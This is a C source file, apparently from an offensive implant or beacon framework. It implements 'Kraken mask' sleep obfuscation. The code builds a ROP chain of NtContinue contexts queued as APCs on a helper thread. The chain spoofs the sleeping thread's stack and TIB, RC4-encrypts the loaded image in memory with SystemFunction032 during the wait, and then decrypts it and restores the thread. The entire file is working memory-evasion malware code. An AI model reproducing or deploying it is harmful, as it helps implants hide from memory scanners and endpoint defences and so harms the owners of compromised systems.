#ifdef SLEEP_OBF_KRAKEN_MASK

typedef struct _KRAKEN_STATE {
    CONTEXT         Ctx[16];        /* 16 ROP contexts                  */
    CONTEXT         CtxSpf;         /* spoof thread context (RSP source)*/
    CONTEXT         CtxCap;         /* captured main sleeping context   */
    USTRING         Key;            /* RC4 key descriptor               */
    USTRING         Img;            /* RC4 data descriptor (image)      */
    CHAR            KeyBuf[16];     /* RC4 key material                 */
    DWORD           OldProtect;     /* VirtualProtect old protection    */
    LARGE_INTEGER   SleepTimeout;   /* sleep duration for WFSO          */
    NT_TIB          TibSpoof;       /* spoof thread's TIB               */
    NT_TIB          TibBackup;      /* main thread's original TIB       */
    PVOID           pMainTib;       /* pointer to main thread's TEB     */
} KRAKEN_STATE;

VOID KrakenMaskObf(HOOK_TYPE Hook, HOOK_ARGS *Args)
{
    ULONG CurrentTid = KERNEL32$GetCurrentThreadId();
    ULONG SpoofTid   = RndThreadId(CurrentTid);

    StealthDbg("starting: CurrentTid=%lu SpoofTid=%lu\n", CurrentTid, SpoofTid);

    HANDLE DupThreadHandle  = NULL;
    HANDLE MainThreadHandle = NULL;
    HANDLE hHelper          = NULL;
    HANDLE hEvtStart        = NULL;
    HANDLE hEvtEnd          = NULL;
    int    Inc              = 0;

    /* ── Heap-allocate all APC-referenced state ───────────────────── */
    KRAKEN_STATE *S = (KRAKEN_STATE *)KERNEL32$HeapAlloc(
        KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(KRAKEN_STATE));
    if (!S) {
        StealthDbg("ERROR: HeapAlloc failed\n");
        HandleUnexpectedError(Hook, Args);
        return;
    }

    CONTEXT ctxBase;
    MSVCRT$memset(&ctxBase, 0, sizeof(CONTEXT));

    /* ── Validate prerequisites ───────────────────────────────────── */
    if (!g_ImageBase || !g_ImageSize) {
        StealthDbg("ERROR: ImageBase/ImageSize not set\n");
        goto cleanup_early;
    }

    if (!g_pNtContinue || !g_pSysFunc032 || !g_pNtTestAlert ||
        !g_pNtWaitForSingleObject || !g_pNtSetEvent ||
        !g_pNtSignalAndWaitForSingleObject || !g_pNtAlertResumeThread ||
        !g_pRtlExitUserThread || !g_pRtlCaptureContext || !g_JmpRdiGadget ||
        !g_pNtSuspendThread || !g_pNtResumeThread || !g_pRtlMoveMemory) {
        StealthDbg("ERROR: required functions/gadgets not resolved\n");
        goto cleanup_early;
    }

    /* ── Setup RC4 key + image descriptors ────────────────────────── */
    MSVCRT$memset(S->KeyBuf, 0x55, 16);
    S->Key.Buffer           = S->KeyBuf;
    S->Key.Length           = S->Key.MaximumLength = 16;
    S->Img.Buffer           = g_ImageBase;
    S->Img.Length           = S->Img.MaximumLength = g_ImageSize;

    StealthDbg("image region: base=%p size=0x%lx\n", g_ImageBase, (unsigned long)g_ImageSize);

    if (Hook == WAIT_FOR_SINGLE_OBJECT_EX) {
        S->SleepTimeout.QuadPart = -(LONGLONG)Args->WaitForSingleObjectExArgs.dwMilliseconds * 10000LL;
    }

    /* ── Open spoof + main thread handles ─────────────────────────── */
    DupThreadHandle = KERNEL32$OpenThread(THREAD_ALL_ACCESS, FALSE, SpoofTid);
    StealthDbg("spoof thread: TID=%lu handle=%p\n", SpoofTid, DupThreadHandle);

    KERNEL32$DuplicateHandle(
        NtCurrentProcess(),
        NtCurrentThread(),
        NtCurrentProcess(),
        &MainThreadHandle,
        THREAD_ALL_ACCESS,
        FALSE,
        0
    );
    if (!MainThreadHandle) {
        StealthDbg("ERROR: DuplicateHandle failed\n");
        goto cleanup_handles;
    }

    /* ── Create sync events ────────────────────────────────────────── */
    hEvtStart = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);
    hEvtEnd   = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!hEvtStart || !hEvtEnd) {
        StealthDbg("ERROR: CreateEventW failed\n");
        goto cleanup_handles;
    }

    /* ── Capture spoof thread context (for RSP) ───────────────────── */
    S->CtxSpf.ContextFlags = CONTEXT_FULL;
    if (DupThreadHandle) {
        KERNEL32$GetThreadContext(DupThreadHandle, &S->CtxSpf);
        StealthDbg("CtxSpf: Rip=0x%llx Rsp=0x%llx\n", (unsigned long long)S->CtxSpf.Rip, (unsigned long long)S->CtxSpf.Rsp);
    }

    /* ── Get spoof thread's NT_TIB ────────────────────────────────── */
    if (DupThreadHandle) {
        THREAD_BASIC_INFORMATION tbi;
        MSVCRT$memset(&tbi, 0, sizeof(tbi));
        NTDLL$NtQueryInformationThread(DupThreadHandle, 0, &tbi, sizeof(tbi), NULL);
        if (tbi.TebBaseAddress) {
            MSVCRT$memcpy(&S->TibSpoof, tbi.TebBaseAddress, sizeof(NT_TIB));
            StealthDbg("SpoofTIB: StackBase=%p StackLimit=%p\n", S->TibSpoof.StackBase, S->TibSpoof.StackLimit);
        }
    }

    /* ── Backup main thread's NT_TIB ──────────────────────────────── */
#if defined(_M_X64)
    __asm__ volatile ("movq %%gs:0x30, %0" : "=r" (S->pMainTib));
#elif defined(_M_IX86)
    __asm__ volatile ("movl %%fs:0x18, %0" : "=r" (S->pMainTib));
#endif  
    MSVCRT$memcpy(&S->TibBackup, S->pMainTib, sizeof(NT_TIB));
    StealthDbg("MainTIB: StackBase=%p StackLimit=%p TEB=%p\n",
        S->TibBackup.StackBase, S->TibBackup.StackLimit, S->pMainTib);

    /* ── Prepare CtxCap for runtime capture ───────────────────────── */
    S->CtxCap.ContextFlags = CONTEXT_FULL;

    /* ── Create helper thread (suspended, entry = NtTestAlert) ────── */
    hHelper = KERNEL32$CreateThread(NULL, 0x10000,
                  (LPTHREAD_START_ROUTINE)g_pNtTestAlert,
                  NULL, CREATE_SUSPENDED, NULL);
    if (!hHelper) {
        StealthDbg("ERROR: CreateThread failed\n");
        goto cleanup_handles;
    }

    /* ── Capture helper base context ──────────────────────────────── */
    ctxBase.ContextFlags = CONTEXT_FULL;
    KERNEL32$GetThreadContext(hHelper, &ctxBase);
    *(PULONG_PTR)(ctxBase.Rsp) = (ULONG_PTR)g_pNtTestAlert;

    for (int i = 0; i < 16; i++)
        MSVCRT$memcpy(&S->Ctx[i], &ctxBase, sizeof(CONTEXT));

    /* ═════════════════════════════════════════════════════════════════
     *  Build ROP chain - CET-compatible stack spoofing
     *
     *  0:  NtWaitForSingleObject(hEvtStart)        - gate
     *  1:  GetThreadContext(Main, &CtxCap)          - capture sleeping RIP
     *  2:  RtlCopyMemory(&CtxSpf.Rip, &CtxCap.Rip) - preserve RIP for CET
     *  3:  RtlCopyMemory(TEB, &TibSpoof)           - swap stack bounds
     *  4:  SetThreadContext(Main, &CtxSpf)          - spoof (CET safe)
     *  5:  VirtualProtect(image → RW)
     *  6:  SystemFunction032(encrypt)
     *  7:  <sleep / hook dispatch>
     *  8:  SystemFunction032(decrypt)
     *  9:  restore_section_permissions
     *  10: NtSuspendThread(Main)
     *  11: RtlCopyMemory(TEB, &TibBackup)          - restore stack bounds
     *  12: SetThreadContext(Main, &CtxCap)          - restore (CET safe)
     *  13: NtSetEvent(hEvtEnd)
     *  14: NtResumeThread(Main)
     *  15: RtlExitUserThread(0)
     * ═════════════════════════════════════════════════════════════════ */
    Inc = 0;

    /* ROP 0: gate */
    S->Ctx[Inc].Rip = (DWORD64)g_JmpRdiGadget;
    S->Ctx[Inc].Rdi = (DWORD64)g_pNtWaitForSingleObject;
    S->Ctx[Inc].Rcx = (DWORD64)hEvtStart;
    S->Ctx[Inc].Rdx = FALSE;
    S->Ctx[Inc].R8  = 0;
    Inc++;

    /* ROP 1: GetThreadContext(MainThread, &CtxCap) - capture sleeping context */
    S->Ctx[Inc].Rip = (DWORD64)g_JmpRdiGadget;
    S->Ctx[Inc].Rdi = (DWORD64)g_pGetThreadContext;
    S->Ctx[Inc].Rcx = (DWORD64)MainThreadHandle;
    S->Ctx[Inc].Rdx = (DWORD64)&S->CtxCap;
    Inc++;

    /* ROP 2: RtlCopyMemory(&CtxSpf.Rip, &CtxCap.Rip, 8) - copy sleeping RIP into spoof */
    S->Ctx[Inc].Rip = (DWORD64)g_JmpRdiGadget;
    S->Ctx[Inc].Rdi = (DWORD64)g_pRtlMoveMemory;
    S->Ctx[Inc].Rcx = (DWORD64)&S->CtxSpf.Rip;
    S->Ctx[Inc].Rdx = (DWORD64)&S->CtxCap.Rip;
    S->Ctx[Inc].R8  = (DWORD64)sizeof(DWORD64);
    Inc++;

    /* ROP 3: RtlCopyMemory(TEB->NtTib, &TibSpoof, sizeof(NT_TIB)) - swap stack bounds */
    S->Ctx[Inc].Rip = (DWORD64)g_JmpRdiGadget;
    S->Ctx[Inc].Rdi = (DWORD64)g_pRtlMoveMemory;
    S->Ctx[Inc].Rcx = (DWORD64)S->pMainTib;
    S->Ctx[Inc].Rdx = (DWORD64)&S->TibSpoof;
    S->Ctx[Inc].R8  = (DWORD64)sizeof(NT_TIB);
    Inc++;

    /* ROP 4: SetThreadContext(MainThread, &CtxSpf) - spoof RSP, RIP unchanged → CET OK */
    S->Ctx[Inc].Rip = (DWORD64)g_JmpRdiGadget;
    S->Ctx[Inc].Rdi = (DWORD64)g_pSetThreadContext;
    S->Ctx[Inc].Rcx = (DWORD64)MainThreadHandle;
    S->Ctx[Inc].Rdx = (DWORD64)&S->CtxSpf;
    Inc++;

    /* ROP 5: VirtualProtect(image → PAGE_READWRITE) */
    S->Ctx[Inc].Rip = (DWORD64)g_JmpRdiGadget;
    S->Ctx[Inc].Rdi = (DWORD64)g_pVirtualProtect;
    S->Ctx[Inc].Rcx = (DWORD64)g_ImageBase;
    S->Ctx[Inc].Rdx = (DWORD64)g_ImageSize;
    S->Ctx[Inc].R8  = PAGE_READWRITE;
    S->Ctx[Inc].R9  = (DWORD64)&S->OldProtect;
    Inc++;

    /* ROP 6: SystemFunction032 - RC4 encrypt */
    S->Ctx[Inc].Rip = (DWORD64)g_JmpRdiGadget;
    S->Ctx[Inc].Rdi = (DWORD64)g_pSysFunc032;
    S->Ctx[Inc].Rcx = (DWORD64)&S->Img;
    S->Ctx[Inc].Rdx = (DWORD64)&S->Key;
    Inc++;

    /* ROP 7: sleep / hook dispatch */
    switch (Hook) {
    case WAIT_FOR_SINGLE_OBJECT_EX:
        S->Ctx[Inc].Rip = (DWORD64)g_JmpRdiGadget;
        S->Ctx[Inc].Rdi = (DWORD64)g_pNtWaitForSingleObject;
        S->Ctx[Inc].Rcx = (DWORD64)Args->WaitForSingleObjectExArgs.hObject;
        S->Ctx[Inc].Rdx = FALSE;
        S->Ctx[Inc].R8  = (DWORD64)&S->SleepTimeout;
        break;
    case WAIT_FOR_MULTIPLE_OBJECTS:
        S->Ctx[Inc].Rip = (DWORD64)g_JmpRdiGadget;
        S->Ctx[Inc].Rdi = (DWORD64)Args->WaitForMultipleObjectsArgs.OriginalFunc;
        S->Ctx[Inc].Rcx = (DWORD64)Args->WaitForMultipleObjectsArgs.nCount;
        S->Ctx[Inc].Rdx = (DWORD64)Args->WaitForMultipleObjectsArgs.lpHandles;
        S->Ctx[Inc].R8  = (DWORD64)Args->WaitForMultipleObjectsArgs.bWaitAll;
        S->Ctx[Inc].R9  = (DWORD64)Args->WaitForMultipleObjectsArgs.dwMilliseconds;
        break;
    case CONNECT_NAMED_PIPE:
        S->Ctx[Inc].Rip = (DWORD64)g_JmpRdiGadget;
        S->Ctx[Inc].Rdi = (DWORD64)Args->ConnectNamedPipeArgs.OriginalFunc;
        S->Ctx[Inc].Rcx = (DWORD64)Args->ConnectNamedPipeArgs.hPipe;
        S->Ctx[Inc].Rdx = (DWORD64)Args->ConnectNamedPipeArgs.lpOverlapped;
        break;
    default:
        StealthDbg("ERROR: unknown hook type %d\n", Hook);
        break;
    }
    Inc++;

    /* ROP 8: SystemFunction032 - RC4 decrypt */
    S->Ctx[Inc].Rip = (DWORD64)g_JmpRdiGadget;
    S->Ctx[Inc].Rdi = (DWORD64)g_pSysFunc032;
    S->Ctx[Inc].Rcx = (DWORD64)&S->Img;
    S->Ctx[Inc].Rdx = (DWORD64)&S->Key;
    Inc++;

    /* ROP 9: restore_section_permissions */
    S->Ctx[Inc].Rip = (DWORD64)g_JmpRdiGadget;
    S->Ctx[Inc].Rdi = (DWORD64)restore_section_permissions;
    Inc++;

    /* ROP 10: NtSuspendThread(MainThread) - suspend for safe restore */
    S->Ctx[Inc].Rip = (DWORD64)g_JmpRdiGadget;
    S->Ctx[Inc].Rdi = (DWORD64)g_pNtSuspendThread;
    S->Ctx[Inc].Rcx = (DWORD64)MainThreadHandle;
    S->Ctx[Inc].Rdx = 0;
    Inc++;

    /* ROP 11: RtlCopyMemory(TEB->NtTib, &TibBackup, sizeof(NT_TIB)) - restore TIB */
    S->Ctx[Inc].Rip = (DWORD64)g_JmpRdiGadget;
    S->Ctx[Inc].Rdi = (DWORD64)g_pRtlMoveMemory;
    S->Ctx[Inc].Rcx = (DWORD64)S->pMainTib;
    S->Ctx[Inc].Rdx = (DWORD64)&S->TibBackup;
    S->Ctx[Inc].R8  = (DWORD64)sizeof(NT_TIB);
    Inc++;

    /* ROP 12: SetThreadContext(MainThread, &CtxCap) - restore exact sleeping state (CET safe) */
    S->Ctx[Inc].Rip = (DWORD64)g_JmpRdiGadget;
    S->Ctx[Inc].Rdi = (DWORD64)g_pSetThreadContext;
    S->Ctx[Inc].Rcx = (DWORD64)MainThreadHandle;
    S->Ctx[Inc].Rdx = (DWORD64)&S->CtxCap;
    Inc++;

    /* ROP 13: NtSetEvent(hEvtEnd) - signal completion */
    S->Ctx[Inc].Rip = (DWORD64)g_JmpRdiGadget;
    S->Ctx[Inc].Rdi = (DWORD64)g_pNtSetEvent;
    S->Ctx[Inc].Rcx = (DWORD64)hEvtEnd;
    S->Ctx[Inc].Rdx = 0;
    Inc++;

    /* ROP 14: NtResumeThread(MainThread) */
    S->Ctx[Inc].Rip = (DWORD64)g_JmpRdiGadget;
    S->Ctx[Inc].Rdi = (DWORD64)g_pNtResumeThread;
    S->Ctx[Inc].Rcx = (DWORD64)MainThreadHandle;
    S->Ctx[Inc].Rdx = 0;
    Inc++;

    /* ROP 15: RtlExitUserThread(0) */
    S->Ctx[Inc].Rip = (DWORD64)g_JmpRdiGadget;
    S->Ctx[Inc].Rdi = (DWORD64)g_pRtlExitUserThread;
    S->Ctx[Inc].Rcx = 0;
    Inc++;

    /* ── Queue all APCs ───────────────────────────────────────────── */
    StealthDbg("queueing %d APCs via NtQueueApcThread\n", Inc);
    for (int i = 0; i < Inc; i++) {
        NTDLL$NtQueueApcThread(hHelper, (PVOID)g_NtContinueGadget,
                               &S->Ctx[i], (PVOID)(ULONG_PTR)FALSE, NULL);
    }

    /* ── Alert-resume helper ─────────────────────────────────────── */
    StealthDbg("alert-resuming helper thread\n");
    typedef NTSTATUS (NTAPI *fnNtAlertResumeThread)(HANDLE, PULONG);
    ULONG SuspendCount = 0;
    ((fnNtAlertResumeThread)g_pNtAlertResumeThread)(hHelper, &SuspendCount);

    /* ── Atomic signal+wait (no RtlCaptureContext needed anymore) ── */
    StealthDbg("NtSignalAndWaitForSingleObject: signal hEvtStart, wait hEvtEnd\n");
    typedef NTSTATUS (NTAPI *fnNtSignalAndWait)(HANDLE, HANDLE, BOOLEAN, PLARGE_INTEGER);
    ((fnNtSignalAndWait)g_pNtSignalAndWaitForSingleObject)(
        hEvtStart, hEvtEnd, FALSE, NULL);

    /* ── Cleanup - reached after NtSignalAndWait returns ──────────── */
    StealthDbg("chain complete - cleaning up\n");
    KERNEL32$CloseHandle(hHelper);
    if (DupThreadHandle)  KERNEL32$CloseHandle(DupThreadHandle);
    if (MainThreadHandle) KERNEL32$CloseHandle(MainThreadHandle);
    KERNEL32$CloseHandle(hEvtStart);
    KERNEL32$CloseHandle(hEvtEnd);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, S);
    StealthDbg("done\n");
    return;

cleanup_handles:
    if (hHelper)          KERNEL32$CloseHandle(hHelper);
    if (DupThreadHandle)  KERNEL32$CloseHandle(DupThreadHandle);
    if (MainThreadHandle) KERNEL32$CloseHandle(MainThreadHandle);
    if (hEvtStart)        KERNEL32$CloseHandle(hEvtStart);
    if (hEvtEnd)          KERNEL32$CloseHandle(hEvtEnd);
cleanup_early:
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, S);
    HandleUnexpectedError(Hook, Args);
    return;
}

#endif /* SLEEP_OBF_KRAKEN_MASK */